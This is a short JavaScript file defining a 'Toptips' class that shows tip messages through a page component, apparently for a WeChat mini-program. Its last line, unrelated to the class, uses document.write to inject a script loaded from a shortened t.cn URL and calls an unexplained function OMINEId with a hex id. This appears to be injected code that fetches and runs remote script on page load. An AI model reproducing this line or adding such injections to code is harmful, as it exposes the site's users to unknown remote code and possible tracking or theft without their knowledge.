export default class Toptips{
  constructor (props={}) {
    this.options = {
      context: {}
    }
  }

  show (ele, option) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const toptips = ctx.selectComponent(ele);
    this.options.context = toptips
    toptips.setMsg(option)
  }
}
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
